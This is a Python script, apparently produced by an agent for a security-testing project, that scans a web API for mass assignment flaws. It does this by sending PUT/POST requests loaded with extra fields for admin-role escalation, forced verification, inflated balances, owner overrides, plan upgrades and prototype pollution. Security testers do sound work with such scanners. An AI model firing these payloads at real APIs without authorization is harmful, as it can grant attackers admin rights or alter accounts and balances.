#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
# Task:    Mass assignment scanner
# Mission: API Authentication Bypass Detector
# Agent:   @quinn
# Date:    2026-03-23T18:00:30.733Z
# Repo:    https://github.com/mandosclaw/swarmpulse-results
# ─────────────────────────────────────────────────────────────

"""Mass assignment scanner: sends extra fields in POST/PUT requests to detect mass assignment vulnerabilities."""

import argparse
import json
import logging
import sys
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Any, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

DANGEROUS_FIELDS = [
    "is_admin", "isAdmin", "admin", "role", "roles", "permission", "permissions",
    "is_superuser", "superuser", "verified", "is_verified", "active", "is_active",
    "banned", "is_banned", "credit_balance", "credits", "balance", "account_balance",
    "subscription_level", "plan", "tier", "price_override", "discount",
    "user_id", "userId", "owner_id", "ownerId", "account_id", "accountId",
    "created_at", "createdAt", "updated_at", "updatedAt", "deleted_at",
    "password_hash", "passwordHash", "api_key", "apiKey", "secret_key",
    "email_verified", "phone_verified", "two_factor_enabled", "mfa_enabled",
    "internal_notes", "internal_id", "metadata", "__proto__", "constructor",
]

ATTACK_PAYLOADS = {
    "privilege_escalation": {"is_admin": True, "role": "admin", "permission": "superuser"},
    "account_verification": {"verified": True, "email_verified": True, "is_verified": True},
    "credit_injection": {"balance": 999999, "credits": 999999, "credit_balance": 10000},
    "owner_override": {"user_id": 1, "owner_id": 1, "account_id": 1},
    "plan_upgrade": {"plan": "enterprise", "tier": "premium", "subscription_level": "unlimited"},
    "prototype_pollution": {"__proto__": {"admin": True}, "constructor": {"prototype": {"admin": True}}},
}


@dataclass
class MassAssignmentFinding:
    endpoint: str
    method: str
    attack_type: str
    fields_sent: dict[str, Any]
    baseline_response: dict[str, Any]
    attack_response: dict[str, Any]
    vulnerable: bool
    evidence: list[str]


def http_request(url: str, method: str, body: dict, token: str, timeout: int = 10) -> tuple[int, dict]:
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method=method, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body_str = resp.read().decode(errors="replace")
            try:
                return resp.status, json.loads(body_str)
            except json.JSONDecodeError:
                return resp.status, {"_raw": body_str[:200]}
    except urllib.error.HTTPError as e:
        body_str = e.read().decode(errors="replace")
        try:
            return e.code, json.loads(body_str)
        except json.JSONDecodeError:
            return e.code, {"_raw": body_str[:200]}
    except Exception as ex:
        return 0, {"error": str(ex)}


def detect_mass_assignment(baseline: dict, attack_resp: dict, attack_payload: dict, status: int) -> tuple[bool, list[str]]:
    evidence = []

    if status in (200, 201):
        for key, value in attack_payload.items():
            resp_val = attack_resp.get(key)
            if resp_val == value:
                evidence.append(f"Field '{key}' accepted and reflected back with value: {value}")
            elif key in attack_resp:
                evidence.append(f"Field '{key}' present in response (value: {resp_val})")

        baseline_keys = set(str(v) for v in baseline.values() if isinstance(v, (bool, int, str)))
        attack_keys = set(str(v) for v in attack_resp.values() if isinstance(v, (bool, int, str)))
        new_values = attack_keys - baseline_keys
        if new_values:
            evidence.append(f"New values in response after mass assignment: {list(new_values)[:3]}")

    return len(evidence) > 0, evidence


def scan_endpoint(url: str, method: str, base_payload: dict, token: str) -> list[MassAssignmentFinding]:
    findings = []

    logger.info(f"Getting baseline for {method} {url}")
    baseline_status, baseline_resp = http_request(url, method, base_payload, token)
    logger.info(f"Baseline: HTTP {baseline_status}")

    for attack_name, attack_fields in ATTACK_PAYLOADS.items():
        attack_body = {**base_payload, **attack_fields}
        status, resp = http_request(url, method, attack_body, token)
        vulnerable, evidence = detect_mass_assignment(baseline_resp, resp, attack_fields, status)

        finding = MassAssignmentFinding(endpoint=url, method=method, attack_type=attack_name, fields_sent=attack_fields, baseline_response=baseline_resp, attack_response=resp, vulnerable=vulnerable, evidence=evidence)
        findings.append(finding)

        if vulnerable:
            logger.warning(f"  [VULN] {attack_name}: {evidence}")
        else:
            logger.info(f"  [SAFE] {attack_name}: HTTP {status}")

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="Mass assignment vulnerability scanner")
    parser.add_argument("--url", default="https://api.example.com/api/users/profile")
    parser.add_argument("--method", default="PUT", choices=["POST", "PUT", "PATCH"])
    parser.add_argument("--token", default="dummy-token")
    parser.add_argument("--base-payload", default='{"name": "Test User", "email": "test@example.com"}')
    parser.add_argument("--output", default="mass_assignment_findings.json")
    args = parser.parse_args()

    try:
        base_payload = json.loads(args.base_payload)
    except json.JSONDecodeError:
        logger.error("Invalid base payload JSON")
        sys.exit(1)

    logger.info(f"Scanning {args.method} {args.url} for mass assignment vulnerabilities")
    findings = scan_endpoint(args.url, args.method, base_payload, args.token)

    vulnerabilities = [f for f in findings if f.vulnerable]
    report = {"endpoint": args.url, "method": args.method, "total_tests": len(findings), "vulnerabilities": len(vulnerabilities), "findings": [{"attack_type": f.attack_type, "vulnerable": f.vulnerable, "fields_tested": list(f.fields_sent.keys()), "evidence": f.evidence} for f in findings if f.vulnerable]}

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    logger.info(f"Scan complete: {len(vulnerabilities)} vulnerabilities found")
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
